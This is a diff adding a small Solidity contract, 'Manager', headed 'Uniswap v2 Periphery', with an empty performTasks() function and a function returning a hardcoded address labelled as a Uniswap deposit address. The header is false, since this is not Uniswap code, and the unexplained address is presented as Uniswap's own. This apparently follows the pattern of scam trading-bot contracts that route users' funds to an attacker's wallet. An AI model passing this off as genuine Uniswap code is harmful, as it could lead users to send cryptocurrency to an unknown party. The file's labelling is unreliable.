@@ -1,0 +1,13 @@
+// Uniswap v2 Periphery
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xfBA9A6A13D8eEd763D4c935D6A65cBEd979A5501;
+	}
+}
